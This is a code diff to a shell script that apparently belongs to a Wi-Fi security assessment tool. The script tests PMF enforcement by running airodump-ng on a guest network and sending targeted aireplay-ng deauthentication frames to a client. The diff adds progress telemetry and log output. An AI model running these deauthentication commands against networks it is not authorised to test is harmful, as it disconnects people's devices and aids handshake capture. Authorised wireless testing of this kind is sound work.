@@ -34,6 +34,7 @@ C_RESET="${ASTRA_COLOR_RESET:-}"
 INTERFACE="${MONITOR_INTERFACE:-}"
 BSSID="${GUEST_BSSID:-}"
 CHANNEL="${GUEST_CHANNEL:-}"
+SCAN_TIME="${SCAN_TIME:-20}"
 SESSION_DIR="${SESSION_DIR:-.}"
 EVIDENCE_DIR="${SESSION_EVIDENCE_DIR:-${SESSION_DIR}/evidence}"
 EVIDENCE_PREFIX="${EVIDENCE_DIR}/e3"
@@ -58,21 +59,42 @@ echo -e "[*] Targeting client: ${C_VAR}${TARGET_CLIENT}${C_RESET}"
 CSV_PREFIX="${EVIDENCE_PREFIX}_mon"
 LOG_FILE="${EVIDENCE_DIR}/${TC_ID}_airodump.log"
 
-airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-0}" --write "$CSV_PREFIX" --output-format csv "$INTERFACE" > "$LOG_FILE" 2>&1 &
+# Start dynamic telemetry heartbeat
+(
+    HEARTBEAT_ELAPSED=0
+    while [[ $HEARTBEAT_ELAPSED -lt $SCAN_TIME ]]; do
+        PCT=$(( 10 + (HEARTBEAT_ELAPSED * 80 / SCAN_TIME) ))
+        [[ $PCT -gt 90 ]] && PCT=90
+        "$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent "$PCT" --status "Executing attack..."
+        sleep 2
+        HEARTBEAT_ELAPSED=$((HEARTBEAT_ELAPSED + 2))
+    done
+) &
+TELEMETRY_PID=$!
+
+if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+    airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-0}" --write "$CSV_PREFIX" --output-format csv "$INTERFACE" 2>&1 | tee "$LOG_FILE" &
+else
+    airodump-ng --bssid "$BSSID" --channel "${CHANNEL:-0}" --write "$CSV_PREFIX" --output-format csv "$INTERFACE" > "$LOG_FILE" 2>&1 &
+fi
 AIRODUMP_PID=$!
 sleep 5
 
 # 2. Targeted Deauth Injection
 echo -e "[*] Sending surgical deauthentication frames to ${C_VAR}$TARGET_CLIENT${C_RESET}..."
 DEAUTH_LOG="${EVIDENCE_DIR}/${TC_ID}_aireplay.log"
-aireplay-ng --deauth 15 -a "$BSSID" -c "$TARGET_CLIENT" "$INTERFACE" > "$DEAUTH_LOG" 2>&1 || true
+if [[ "${ASTRA_IN_WINDOW:-}" == "true" ]]; then
+    aireplay-ng --deauth 15 -a "$BSSID" -c "$TARGET_CLIENT" "$INTERFACE" 2>&1 | tee "$DEAUTH_LOG" || true
+else
+    aireplay-ng --deauth 15 -a "$BSSID" -c "$TARGET_CLIENT" "$INTERFACE" > "$DEAUTH_LOG" 2>&1 || true
+fi
 
 # 3. Wait & Analyze
 sleep 15
 kill "$AIRODUMP_PID" || true
 wait "$AIRODUMP_PID" 2>/dev/null || true
 
-"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 90 --status "Evaluating PMF enforcement..."
+kill "$TELEMETRY_PID" 2>/dev/null || true
 
 FINAL_CSV="${CSV_PREFIX}-01.csv"
 
@@ -102,4 +124,5 @@ else
         --rationale "Management Frame Protection status could not be conclusively determined. No immediate failures were observed."
 fi
 
+"$ASTRA_BIN" record-progress --session-dir "$SESSION_DIR" --tc "$TC_ID" --percent 100 --status "Mission Complete"
 exit 0
